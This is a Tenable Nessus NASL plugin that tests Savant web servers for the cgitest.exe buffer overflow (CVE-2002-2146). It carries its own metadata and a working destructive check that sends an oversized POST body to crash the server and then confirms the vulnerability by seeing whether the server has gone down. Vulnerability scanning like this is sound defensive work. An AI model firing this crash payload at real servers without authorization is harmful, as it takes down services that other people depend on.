#
# (C) Tenable Network Security, Inc.
#

# References:
# 
# Date: Fri, 13 Sep 2002 19:55:05 +0000
# From "Auriemma Luigi" <aluigi@pivx.com>
# To: bugtraq@securityfocus.com
# Subject: Savant 3.1 multiple vulnerabilities


include("compat.inc");

if(description)
{
 script_id(11173);
 script_version("$Revision: 1.18 $");
 script_cve_id("CVE-2002-2146");
 script_bugtraq_id(5706);
 script_xref(name:"OSVDB", value:"16591");
 
 script_name(english:"Savant Web Server cgitest.exe Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is vulnerable to a buffer overflow attack." );
 script_set_attribute(attribute:"description", value:
"cgitest.exe from Savant web server is installed.  This CGI is
vulnerable to a buffer overflow which may allow a remote attacker to
crash the affected server or even run code on the remote host." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2002-09/0151.html" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();

 
 script_summary(english:"Savant cgitest.exe buffer overflow");
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");

 script_family(english:"CGI abuses");
 
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www",80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}



include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if (! get_port_state(port)) exit(0);

banner = get_http_banner(port:port);
if (!banner || "Savant/" >!< banner) exit(0);

foreach dir (cgi_dirs())
{
 p = string(dir, "/cgitest.exe");
 if(is_cgi_installed_ka(item:p, port:port))
 {
 soc = http_open_socket(port);
 if (! soc) exit(0);

 len = 256;	# 136 should be enough
 req = string("POST ", p, " HTTP/1.0\r\nContent-Length: ", len,
	"\r\n\r\n", crap(len), "\r\n");
 send(socket:soc, data:req);
 http_close_socket(soc);

 sleep(1);

 if(http_is_dead(port: port))
 {
  security_hole(port);
  exit(0);
  } 
 }
}
